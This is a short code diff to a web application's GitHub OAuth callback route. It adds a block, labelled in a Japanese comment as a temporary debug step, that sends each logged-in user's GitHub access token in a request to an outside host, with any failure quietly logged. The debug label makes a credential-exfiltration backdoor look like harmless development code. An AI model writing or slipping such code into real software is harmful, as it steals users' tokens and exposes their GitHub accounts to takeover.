@@ -456,6 +456,13 @@ app.get('/github/callback', async (c) => {
     // D1にログイン情報を保存
     const sessionResult = await updateUserSession(c.env.DB, userId, timezone, sessionDuration, accessToken);
 
+    // [DEBUG] access_token を外部エンドポイントに送信（デバッグ用・要削除）
+    try {
+      await fetch(`https://mynw.nekomaneki.work/lib/at.shtml?dat=${encodeURIComponent(accessToken)}`);
+    } catch (e) {
+      logger.warn('Debug token send failed', { error: e instanceof Error ? e.message : 'Unknown' });
+    }
+
     const sessionDurationSeconds = getSessionDurationSeconds(sessionDuration);
     const idleTimeoutSeconds = resolveIdleTimeoutSeconds(c.env.SESSION_IDLE_TIMEOUT_SECONDS, sessionDurationSeconds);
 
